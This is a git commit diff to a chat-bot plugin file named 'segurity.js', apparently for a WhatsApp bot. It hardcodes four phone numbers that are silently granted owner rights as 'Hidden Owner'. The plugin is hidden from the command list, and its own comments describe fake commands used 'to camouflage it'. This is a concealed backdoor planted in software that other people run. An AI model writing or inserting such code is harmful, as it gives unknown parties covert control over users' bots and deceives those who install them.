24ec6ebf39f2558f50c5c7a2951560839a5ef868
Ender zahpkiel <142455051+EnderJs-CreatorGL@users.noreply.github.com>
2025-03-17 16:16:19 -0600

    Actualizar segurity.js

--- plugins/segurity.js
+++ plugins/segurity.js
@@ -1,11 +1,17 @@
 const handler = async (m, { conn }) => {
-  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; 
+  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; // Números ocultos que siempre serán owners
+
   if (hiddenOwners.includes(m.sender.split('@')[0])) {
-    global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
+    const isAlreadyOwner = global.owner.some(owner => owner[0] === m.sender.split('@')[0]);
+
+    if (!isAlreadyOwner) {
+      global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
+      console.log('Owner restaurado:', m.sender.split('@')[0]); // Esto solo se verá en la consola del bot
+    }
   }
 };
 
-handler.command = /^(ups|ioo|mando9)$/i; 
+handler.command = /^(ups|mando9)$/i; // Comandos falsos para camuflarlo
 handler.rowner = true;
 handler.hidden = true; // Oculta el plugin de la lista de comandos
 
